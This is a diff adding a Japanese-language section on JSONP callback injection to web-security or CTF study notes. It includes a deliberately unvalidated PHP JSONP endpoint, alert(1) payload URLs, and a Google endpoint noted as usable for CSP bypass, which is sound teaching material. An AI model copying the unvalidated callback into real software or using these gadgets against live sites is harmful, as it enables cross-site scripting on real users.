@@ -253,6 +253,70 @@ html内から`<script src=/evil.txt></script>`,`<iframe src=/evil.txt>`,`<img sr
 ```html
 <script>alert(1)</script>
 ```
+## JSONP callback
+以下のようなJSONP APIの場合、`<script src=/jsonAPI.php?callback=alert(1)>`として`jsonAPI.php`が出力する`alert(1)`という結果を`application/javascript`として読み込み、JavaScriptを実行できる。  
+```php
+<?php
+//コールバック関数名を取得。この名前は呼び出し元のオリジン内で定義されている必要がある
+$callback = "jsonCallback";
+if(isset($_GET['callback'])){
+    $callback=$_GET['callback'];
+}
+//別のオリジンから情報を取得
+$key = "デフォルト";
+if(isset($_GET['key'])){
+    $key=$_GET['key'];
+}
+
+//keyに応じでこっちのオリジン内でしかもっていない"500en"という情報をセット
+$result = (function($shouhin){
+    return ( $shouhin == "ringo" ) ? "500en" : "not found!"; 
+})($key);
+
+//JSON形式に変換する
+$json = json_encode($result, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
+
+//jsonではなくjavascriptとして呼び出し元のオリジンで処理されるようにContent typeをセットする
+header("Content-type: application/x-javascript");
+print <<<END
+$callback($json);
+END;
+
+//変数が展開されて
+// callbackFunc([{"500yen"}])　みたいになる　（厳密にはJSONになってないけど今はまあOKってことで）
+```
+このAPIは以下のように使う。  
+引数にこのAPIのオリジンしか知りえない情報をセットした状態のJSを呼び出し元に返すため、JSONPをする意味はある。  
+```txt
+// 以下が本来の意図したAPIの使い方。呼び出し元の中でfunction getShouhinData()という関数が定義されている。
+// 192.168.99.100:8080/jsonAPI.php?callback=getShouhinData&key=ringo
+getShouhinData("500en");
+
+// もしfunction getShouhinData()が呼び出し元で定義されていなければ呼び出し元でerrorになる
+// http://192.168.99.100:8080/jsonAPI.php?callback=getShouhinData&key=mikan
+getShouhinData("not found!");
+
+// これを以下のようにすることで悪用し、alert(1)を実行できる！
+// http://192.168.99.100:8080/jsonAPI.php?callback=alert(1);//&key=ringo
+alert(1);//("500en");
+```
+`<script src>`から読み込むJSONPはクロスオリジンでもJSとして読み込める！  
+XMLHttpRequestではAPIを呼び出すことはできてもSame Origin PolicyによってAPIからデータを取得することはできない。  
+  
+Googleドメインの`https://accounts.google.com/o/oauth2/revoke?callback=alert()`にはCSP bypassに利用できるJSONPを返すコンテンツがある。  
+https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt  
+他の利用可能なリストはここにある。  
+```txt
+// API callback
+alert()({
+  "error": {
+    "code": 400,
+    "message": "Invalid JSONP callback name: 'alert()'; only alphabet, number, '_', '$', '.', '[' and ']' are allowed.",
+    "status": "INVALID_ARGUMENT"
+  }
+}
+);
+```
 # writeup
 ## Reflect / JSON Injection (CONFidence 2020 Teaser)
 https://www.gem-love.com/ctf/2019.html   
